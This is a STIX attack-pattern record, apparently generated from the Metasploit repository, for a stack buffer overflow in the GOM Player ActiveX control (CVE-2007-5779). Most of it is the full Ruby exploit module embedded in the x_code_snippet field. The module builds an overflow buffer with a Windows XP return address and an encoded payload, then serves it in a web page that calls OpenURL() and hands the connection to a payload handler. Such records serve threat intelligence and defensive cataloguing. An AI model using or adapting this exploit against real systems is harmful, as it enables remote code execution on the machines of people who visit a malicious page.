{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09181770-cd83-4713-8ddb-0d34d47c2582",
    "created": "2024-08-14T16:44:51.76191Z",
    "modified": "2024-08-14T16:44:51.761914Z",
    "name": "GOM Player ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in GOM Player 2.1.6.3499. By sending an overly long string to the \"OpenUrl()\" method located in the GomWeb3.dll Control, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/gom_openurl.rb",
            "external_id": "gom_openurl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5779"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20071030001455/http://secunia.com:80/advisories/27418/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GOM Player ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in GOM Player 2.1.6.3499.\n        By sending an overly long string to the \"OpenUrl()\" method located\n        in the GomWeb3.dll Control, an attacker may be able to execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5779'],\n          [ 'OSVDB', '38282'],\n          [ 'URL', 'http://web.archive.org/web/20071030001455/http://secunia.com:80/advisories/27418/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP2 Pro English',     { 'Ret' => 0x7e497c7b } ], # 10/29/07\n        ],\n      'DisclosureDate' => '2007-10-27',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_english(506) +  [target.ret].pack('V')\n    sploit << p.encoded + rand_text_english(1024 - p.encoded.length)\n\n    # Build out the message\n    content = %Q|\n      <html>\n      <object classid='clsid:DC07C721-79E0-4BD4-A89F-C90871946A31' id='#{vname}'></object>\n      <script language='javascript'>\n      var #{vname} = document.getElementById('#{vname}');\n      var #{strname} = new String('#{sploit}');\n      #{vname}.OpenURL(#{strname});\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-10-27",
    "x_mitre_platforms": [
        "win'"
    ]
}